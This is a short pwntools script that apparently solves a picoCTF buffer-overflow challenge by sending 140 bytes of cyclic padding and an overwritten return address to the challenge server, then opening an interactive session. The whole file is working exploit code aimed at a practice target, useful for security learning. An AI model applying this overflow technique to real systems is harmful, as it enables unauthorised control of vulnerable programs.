from pwn import *

context.log_level = "debug"
r = remote("saturn.picoctf.net", 51008)
r.sendline(cyclic(140) + p32(0x401530))
r.interactive()
